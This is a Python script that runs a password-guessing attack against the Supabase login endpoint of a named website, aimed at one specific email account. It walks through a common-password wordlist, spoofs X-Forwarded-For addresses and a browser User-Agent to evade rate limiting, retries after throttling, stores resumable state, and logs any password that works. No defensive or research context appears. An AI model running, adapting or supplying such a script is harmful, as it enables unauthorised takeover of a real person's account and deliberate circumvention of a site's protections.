import ssl, json, urllib.request, urllib.error, time, random, os

ctx = ssl.create_default_context()
KEY = "<publishable-key>"
URL = "https://onlyfakeai.ru/api/supabase/auth/v1/token?grant_type=password"

# full 10k common, skip first 4500 (tor already covered) - tail section for tuta
commons = []
for line in open("10k-most-common.txt", encoding="utf-8", errors="ignore"):
    p = line.rstrip("\r\n")
    if 6 <= len(p) <= 32:
        commons.append(p)
tail = commons[4500:]
email = "onlyfake@tuta.io"
print(f"[fast-tail] {len(tail)} candidates for {email}", flush=True)

state_file = "fasttail_state.json"
if os.path.exists(state_file):
    state = json.load(open(state_file))
else:
    state = {"i": 0, "hits": [], "throttles": 0}

log = open("fasttail.log", "a", encoding="utf-8")

def do_req(pw, xff):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36",
         "apikey": KEY, "Content-Type": "application/json",
         "X-Forwarded-For": xff}
    body = json.dumps({"email": email, "password": pw}).encode()
    r = urllib.request.Request(URL, data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=20, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

while state["i"] < len(tail):
    pw = tail[state["i"]]
    xff = f"203.0.113.{random.randint(1,250)}"
    st, body = do_req(pw, xff)
    if st == 200:
        state["hits"].append({"email": email, "password": pw, "resp": body[:400]})
        json.dump(state, open(state_file, "w"))
        log.write(f"{time.strftime('%H:%M:%S')} HIT {email}:{pw}\n"); log.flush()
        print(f"\n!!! HIT {email} : {pw}\n{body[:500]}", flush=True)
        break
    if st == 429:
        state["throttles"] += 1
        time.sleep(5)
        continue
    state["i"] += 1
    if state["i"] % 50 == 0:
        json.dump(state, open(state_file, "w"))
        log.write(f"{time.strftime('%H:%M:%S')} {state['i']}/{len(tail)} thr={state['throttles']}\n")
        log.flush()
    time.sleep(0.25)

json.dump(state, open(state_file, "w"))
print("[done]", state["i"], state["hits"], flush=True)
